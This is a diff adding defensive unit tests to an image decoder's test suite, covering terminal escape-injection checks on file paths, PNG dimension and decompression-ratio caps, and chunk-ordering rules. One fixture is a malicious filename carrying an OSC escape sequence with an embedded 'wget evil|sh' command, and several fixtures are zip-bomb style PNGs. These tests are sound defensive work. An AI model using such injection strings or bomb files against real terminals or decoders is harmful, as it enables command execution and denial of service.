@@ -1629,6 +1629,267 @@ fn main() {
     assert_eq(_kii_compute_fit_geometry(100, 0, 80, 24, &f_w, &f_sr), 0 - 1,
               "src_h=0 → -1");
 
+    # ---- M7(c) Finding 6: stderr path-echo ANSI-injection defense ----
+    # kii_path_has_control_bytes is the pure predicate behind
+    # _eprint_path_safe in main.cyr — returns 1 if the path contains
+    # any byte that must NOT be emitted to a terminal-attached fd.
+    # See docs/audit/2026-05-22-audit.md § Finding 6.
+    test_group("M7(c) — kii_path_has_control_bytes: safe paths");
+    assert_eq(kii_path_has_control_bytes(""),                   0, "empty path → safe");
+    assert_eq(kii_path_has_control_bytes("image.png"),          0, "plain ASCII → safe");
+    assert_eq(kii_path_has_control_bytes("/tmp/image.png"),     0, "absolute path → safe");
+    assert_eq(kii_path_has_control_bytes("a b c.png"),          0, "spaces → safe");
+    assert_eq(kii_path_has_control_bytes("./../image.png"),     0, "relative path → safe");
+    # UTF-8 paths must pass through — AGNOS naming uses Hawaiian,
+    # Sanskrit, East-Asian characters whose continuation bytes land
+    # in 0x80–0xBF. "kiʻi" itself contains U+02BB = 0xCA 0xBB.
+    assert_eq(kii_path_has_control_bytes("kiʻi.png"),           0, "UTF-8 (Hawaiian ʻokina) → safe");
+    assert_eq(kii_path_has_control_bytes("画像.png"),            0, "UTF-8 (CJK) → safe");
+    assert_eq(kii_path_has_control_bytes("чёрный.png"),         0, "UTF-8 (Cyrillic) → safe");
+    # Tab and LF are explicitly allowed per the coreutils-`ls`
+    # convention (LF-in-filename is filesystem-legal but rare;
+    # TAB-in-filename is more common, e.g. accidental shell paste).
+    assert_eq(kii_path_has_control_bytes("a\tb.png"),           0, "TAB → safe (allow-listed)");
+    assert_eq(kii_path_has_control_bytes("a\nb.png"),           0, "LF → safe (allow-listed)");
+
+    test_group("M7(c) — kii_path_has_control_bytes: injection vectors");
+    # ESC (0x1B) is the universal ANSI-injection lead byte. Any
+    # path containing it must be suppressed.
+    assert_eq(kii_path_has_control_bytes("\x1bfoo.png"),        1, "ESC → unsafe");
+    assert_eq(kii_path_has_control_bytes("foo\x1b.png"),        1, "ESC mid-path → unsafe");
+    # CVE-2021-25743 analog: malicious filename carrying an OSC
+    # window-title-set + DECRQSS query that would hijack the
+    # terminal if echoed raw.
+    assert_eq(kii_path_has_control_bytes("/tmp/\x1b]2;wget evil|sh\x07.png"), 1,
+              "CVE-2021-25743 OSC-injection attack path → unsafe");
+    # BEL (0x07) is the OSC string terminator — another injection
+    # primitive.
+    assert_eq(kii_path_has_control_bytes("foo\x07.png"),        1, "BEL → unsafe");
+    # DEL (0x7F) is the C0 trailer — never a legitimate filename byte.
+    assert_eq(kii_path_has_control_bytes("foo\x7f.png"),        1, "DEL → unsafe");
+    # NUL is technically not reachable through strlen (terminates
+    # the C-string), but every other C0 control should trip the
+    # predicate. Sample a few representative ones.
+    assert_eq(kii_path_has_control_bytes("a\x01b"),             1, "SOH (0x01) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x08b"),             1, "BS (0x08) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0bb"),             1, "VT (0x0B) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0cb"),             1, "FF (0x0C) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x0db"),             1, "CR (0x0D) → unsafe");
+    assert_eq(kii_path_has_control_bytes("a\x1fb"),             1, "US (0x1F) → unsafe");
+    # Boundary: 0x20 (SPACE) is the first printable byte; must NOT trip.
+    assert_eq(kii_path_has_control_bytes("a\x20b"),             0, "SPACE (0x20) → safe (boundary)");
+    # Boundary: 0x7E (~) is the last 7-bit printable byte; must NOT trip.
+    assert_eq(kii_path_has_control_bytes("a\x7eb"),             0, "TILDE (0x7E) → safe (boundary)");
+    # Boundary: 0x80 is the first UTF-8 continuation byte — must
+    # NOT trip (the audit doc's initial recommendation to reject
+    # 0x80–0x9F was relaxed for UTF-8 ergonomics).
+    assert_eq(kii_path_has_control_bytes("a\x80b"),             0, "0x80 (UTF-8 continuation) → safe (UTF-8 pass-through)");
+
+    # ---- M7(c) Finding 4: PNG § 11.2.2 Table 11.1 enforcement ----
+    # color_type=3 (palette) is spec-legal at bit_depth ∈ {1,2,4,8}
+    # only. Sub-byte depths are already rejected (PNG_ERR_BITDEPTH);
+    # bit_depth=16 with color_type=3 is a stb #1928 Bug 6-class
+    # spec-violation that many decoders accept. kii rejects.
+    test_group("M7(c) — color_type=3 + bit_depth=16 rejection");
+    var pbuf_p16[64];
+    var len_p16 = _ut_build_min_png(&pbuf_p16, 4, 4, 16, 3);
+    file_write_all("/tmp/kii-test-p16.png", &pbuf_p16, len_p16);
+    var pstr_p16[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-p16.png", &pstr_p16), PNG_OK,
+              "palette + 16-bit fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_p16), PNG_ERR_BITDEPTH,
+              "palette + bit_depth=16 rejected (spec § 11.2.2 violation)");
+
+    # ---- M7(c) Finding 1: IHDR dimension caps -------------------------
+    # Caps: KII_MAX_DIM = 65535 per side; KII_MAX_PIXELS = 16M total;
+    # KII_MAX_RAW_BYTES = 256 MB inflated. See
+    # docs/audit/2026-05-22-audit.md § Finding 1.
+    test_group("M7(c) — IHDR dimension caps: rejections");
+
+    # Width = 0 → DIMENSIONS (must be > 0).
+    var pbuf_w0[64];
+    var len_w0 = _ut_build_min_png(&pbuf_w0, 0, 4, 8, 2);
+    file_write_all("/tmp/kii-test-w0.png", &pbuf_w0, len_w0);
+    var pstr_w0[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-w0.png", &pstr_w0), PNG_OK,
+              "width=0 fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_w0), PNG_ERR_DIMENSIONS,
+              "width=0 rejected by dimension cap");
+
+    # Height = 0 → DIMENSIONS.
+    var pbuf_h0[64];
+    var len_h0 = _ut_build_min_png(&pbuf_h0, 4, 0, 8, 2);
+    file_write_all("/tmp/kii-test-h0.png", &pbuf_h0, len_h0);
+    var pstr_h0[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-h0.png", &pstr_h0), PNG_OK,
+              "height=0 fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_h0), PNG_ERR_DIMENSIONS,
+              "height=0 rejected by dimension cap");
+
+    # Width = 65536 (KII_MAX_DIM + 1) → DIMENSIONS (per-side cap).
+    var pbuf_wmax[64];
+    var len_wmax = _ut_build_min_png(&pbuf_wmax, 65536, 1, 8, 2);
+    file_write_all("/tmp/kii-test-wmax.png", &pbuf_wmax, len_wmax);
+    var pstr_wmax[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-wmax.png", &pstr_wmax), PNG_OK,
+              "width=65536 fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_wmax), PNG_ERR_DIMENSIONS,
+              "width=65536 (> KII_MAX_DIM) rejected");
+
+    # Lying-IHDR zip-bomb: width=8192 × height=8192 = 67M pixels >
+    # KII_MAX_PIXELS (16M). Per-side caps pass; total-pixel cap trips.
+    # See § Finding 1 attack vector.
+    var pbuf_bomb[64];
+    var len_bomb = _ut_build_min_png(&pbuf_bomb, 8192, 8192, 8, 6);
+    file_write_all("/tmp/kii-test-bomb.png", &pbuf_bomb, len_bomb);
+    var pstr_bomb[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-bomb.png", &pstr_bomb), PNG_OK,
+              "8192x8192 lying-IHDR fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_bomb), PNG_ERR_DIMENSIONS,
+              "8192x8192 (67M pixels > KII_MAX_PIXELS) rejected");
+
+    test_group("M7(c) — IHDR dimension caps: boundaries + acceptance");
+    # Boundary: 4096x4096 = exactly KII_MAX_PIXELS — must accept.
+    # (will fail the IDAT check, not DIMENSIONS, since no IDAT in fixture)
+    var pbuf_max[64];
+    var len_max = _ut_build_min_png(&pbuf_max, 4096, 4096, 8, 2);
+    file_write_all("/tmp/kii-test-max.png", &pbuf_max, len_max);
+    var pstr_max[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-max.png", &pstr_max), PNG_OK,
+              "4096x4096 boundary fixture parses");
+    assert_eq(png_decode_pixels(&pstr_max), PNG_ERR_NO_IDAT,
+              "4096x4096 (= KII_MAX_PIXELS) accepted — NO_IDAT (not DIMENSIONS)");
+
+    # One-pixel-over: 4096x4097 = 16M+4096 > KII_MAX_PIXELS → reject.
+    var pbuf_max1[64];
+    var len_max1 = _ut_build_min_png(&pbuf_max1, 4096, 4097, 8, 2);
+    file_write_all("/tmp/kii-test-max1.png", &pbuf_max1, len_max1);
+    var pstr_max1[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-max1.png", &pstr_max1), PNG_OK,
+              "4096x4097 one-pixel-over fixture parses");
+    assert_eq(png_decode_pixels(&pstr_max1), PNG_ERR_DIMENSIONS,
+              "4096x4097 (KII_MAX_PIXELS + 4096) rejected");
+
+    # Modest case: 1024x768 RGB — must accept (NO_IDAT in fixture).
+    var pbuf_normal[64];
+    var len_normal = _ut_build_min_png(&pbuf_normal, 1024, 768, 8, 2);
+    file_write_all("/tmp/kii-test-normal.png", &pbuf_normal, len_normal);
+    var pstr_normal[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-normal.png", &pstr_normal), PNG_OK,
+              "1024x768 normal fixture parses");
+    assert_eq(png_decode_pixels(&pstr_normal), PNG_ERR_NO_IDAT,
+              "1024x768 well within caps — NO_IDAT (not DIMENSIONS)");
+
+    # ---- M7(c) Finding 3: compression-ratio cap (DEFLATE 1100:1) ----
+    # A lying-IHDR claiming large dimensions paired with a small IDAT
+    # is the canonical zip-bomb shape. With inflated_size / idat_total
+    # > 1100 (above DEFLATE's theoretical 1032:1 ceiling), reject
+    # before invoking sankoch. See audit § Finding 3.
+    test_group("M7(c) — compression-ratio cap (Finding 3)");
+
+    # 2000x2000 grayscale 8-bit → inflated_size = 2000 × 2001 = ~4 MB.
+    # A 100-byte IDAT gives ratio ≈ 40000 → trips 1100 cap.
+    # The IDAT bytes themselves can be arbitrary — the cap is checked
+    # BEFORE the inflate call, so we don't need a valid zlib stream.
+    var pbuf_bomb_ratio[256];
+    var bomb_idat = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    var len_bomb_ratio = _ut_build_png_with_idat(&pbuf_bomb_ratio, 2000, 2000, 8, 0, 0,
+                                                  bomb_idat, 100);
+    file_write_all("/tmp/kii-test-bomb-ratio.png", &pbuf_bomb_ratio, len_bomb_ratio);
+    var pstr_bomb_ratio[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-bomb-ratio.png", &pstr_bomb_ratio), PNG_OK,
+              "ratio-bomb fixture parses at structural layer");
+    assert_eq(png_decode_pixels(&pstr_bomb_ratio), PNG_ERR_RATIO_TOO_HIGH,
+              "2000x2000 grey + 100B IDAT → ratio 40000:1 rejected");
+
+    # ---- M7(c) Finding 8: chunk-ordering FSM (PNG spec § 5.6) ----
+    # PLTE must (a) precede the first IDAT and (b) appear at most
+    # once. Reject violations at the structural walker with
+    # PNG_ERR_HEADER. The duplicate-PLTE case is the alloc-leak
+    # vector (each PLTE allocates; without this guard the previous
+    # buffer would be silently overwritten).
+    test_group("M7(c) — chunk-ordering FSM (Finding 8)");
+
+    # Fixture: signature (8) + IHDR (25) + PLTE-empty (12) + PLTE-empty (12) + IEND (12) = 69 bytes.
+    # Both PLTEs are zero-length, which is spec-legal individually,
+    # but the second one violates "exactly one PLTE".
+    var pbuf_dup_plte[128];
+    memcpy(&pbuf_dup_plte + 0, PNG_MAGIC, PNG_MAGIC_LEN);
+    _ut_put_u32_be(&pbuf_dup_plte, 8, 13);
+    store8(&pbuf_dup_plte + 12, 0x49); store8(&pbuf_dup_plte + 13, 0x48);
+    store8(&pbuf_dup_plte + 14, 0x44); store8(&pbuf_dup_plte + 15, 0x52);  # "IHDR"
+    _ut_put_u32_be(&pbuf_dup_plte, 16, 4);                                   # width
+    _ut_put_u32_be(&pbuf_dup_plte, 20, 4);                                   # height
+    store8(&pbuf_dup_plte + 24, 8);                                          # bit_depth
+    store8(&pbuf_dup_plte + 25, 3);                                          # color_type=3 (palette)
+    store8(&pbuf_dup_plte + 26, 0);
+    store8(&pbuf_dup_plte + 27, 0);
+    store8(&pbuf_dup_plte + 28, 0);
+    var ihdr_crc_dp = png_crc32(&pbuf_dup_plte + 12, 17);
+    _ut_put_u32_be(&pbuf_dup_plte, 29, ihdr_crc_dp);
+    # PLTE #1 (length 0): just length + type + CRC = 12 bytes.
+    _ut_put_u32_be(&pbuf_dup_plte, 33, 0);
+    store8(&pbuf_dup_plte + 37, 0x50); store8(&pbuf_dup_plte + 38, 0x4C);
+    store8(&pbuf_dup_plte + 39, 0x54); store8(&pbuf_dup_plte + 40, 0x45);    # "PLTE"
+    var plte_crc_dp = png_crc32(&pbuf_dup_plte + 37, 4);
+    _ut_put_u32_be(&pbuf_dup_plte, 41, plte_crc_dp);
+    # PLTE #2 (duplicate, also length 0).
+    _ut_put_u32_be(&pbuf_dup_plte, 45, 0);
+    store8(&pbuf_dup_plte + 49, 0x50); store8(&pbuf_dup_plte + 50, 0x4C);
+    store8(&pbuf_dup_plte + 51, 0x54); store8(&pbuf_dup_plte + 52, 0x45);
+    _ut_put_u32_be(&pbuf_dup_plte, 53, plte_crc_dp);
+    # IEND.
+    _ut_put_u32_be(&pbuf_dup_plte, 57, 0);
+    store8(&pbuf_dup_plte + 61, 0x49); store8(&pbuf_dup_plte + 62, 0x45);
+    store8(&pbuf_dup_plte + 63, 0x4E); store8(&pbuf_dup_plte + 64, 0x44);
+    store8(&pbuf_dup_plte + 65, 0xAE); store8(&pbuf_dup_plte + 66, 0x42);
+    store8(&pbuf_dup_plte + 67, 0x60); store8(&pbuf_dup_plte + 68, 0x82);
+    file_write_all("/tmp/kii-test-dup-plte.png", &pbuf_dup_plte, 69);
+    var pstr_dp[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-dup-plte.png", &pstr_dp), PNG_ERR_HEADER,
+              "duplicate PLTE rejected (spec § 5.6 — exactly one PLTE)");
+
+    # Fixture: signature (8) + IHDR (25) + IDAT (13) + PLTE (12) + IEND (12) = 70 bytes.
+    # IDAT contains one byte to give chunk_len=1; PLTE then follows
+    # (spec violation — PLTE must precede IDATs).
+    var pbuf_plte_after[128];
+    memcpy(&pbuf_plte_after + 0, PNG_MAGIC, PNG_MAGIC_LEN);
+    _ut_put_u32_be(&pbuf_plte_after, 8, 13);
+    store8(&pbuf_plte_after + 12, 0x49); store8(&pbuf_plte_after + 13, 0x48);
+    store8(&pbuf_plte_after + 14, 0x44); store8(&pbuf_plte_after + 15, 0x52);
+    _ut_put_u32_be(&pbuf_plte_after, 16, 4);
+    _ut_put_u32_be(&pbuf_plte_after, 20, 4);
+    store8(&pbuf_plte_after + 24, 8);
+    store8(&pbuf_plte_after + 25, 3);
+    store8(&pbuf_plte_after + 26, 0);
+    store8(&pbuf_plte_after + 27, 0);
+    store8(&pbuf_plte_after + 28, 0);
+    var ihdr_crc_pa = png_crc32(&pbuf_plte_after + 12, 17);
+    _ut_put_u32_be(&pbuf_plte_after, 29, ihdr_crc_pa);
+    # IDAT (length 1, one byte).
+    _ut_put_u32_be(&pbuf_plte_after, 33, 1);
+    store8(&pbuf_plte_after + 37, 0x49); store8(&pbuf_plte_after + 38, 0x44);
+    store8(&pbuf_plte_after + 39, 0x41); store8(&pbuf_plte_after + 40, 0x54);  # "IDAT"
+    store8(&pbuf_plte_after + 41, 0x00);
+    var idat_crc_pa = png_crc32(&pbuf_plte_after + 37, 5);
+    _ut_put_u32_be(&pbuf_plte_after, 42, idat_crc_pa);
+    # PLTE (length 0).
+    _ut_put_u32_be(&pbuf_plte_after, 46, 0);
+    store8(&pbuf_plte_after + 50, 0x50); store8(&pbuf_plte_after + 51, 0x4C);
+    store8(&pbuf_plte_after + 52, 0x54); store8(&pbuf_plte_after + 53, 0x45);
+    var plte_crc_pa = png_crc32(&pbuf_plte_after + 50, 4);
+    _ut_put_u32_be(&pbuf_plte_after, 54, plte_crc_pa);
+    # IEND.
+    _ut_put_u32_be(&pbuf_plte_after, 58, 0);
+    store8(&pbuf_plte_after + 62, 0x49); store8(&pbuf_plte_after + 63, 0x45);
+    store8(&pbuf_plte_after + 64, 0x4E); store8(&pbuf_plte_after + 65, 0x44);
+    store8(&pbuf_plte_after + 66, 0xAE); store8(&pbuf_plte_after + 67, 0x42);
+    store8(&pbuf_plte_after + 68, 0x60); store8(&pbuf_plte_after + 69, 0x82);
+    file_write_all("/tmp/kii-test-plte-after.png", &pbuf_plte_after, 70);
+    var pstr_pa[160];
+    assert_eq(png_decode_structure("/tmp/kii-test-plte-after.png", &pstr_pa), PNG_ERR_HEADER,
+              "PLTE after IDAT rejected (spec § 5.6 — PLTE must precede IDAT)");
+
     test_group("M5(b) — downscale per-color_type normalization (palette PNG)");
     # archlinux-logo.png is palette (color_type=3). Downscale must
     # expand each palette-index byte to a 3-byte RGB triple via
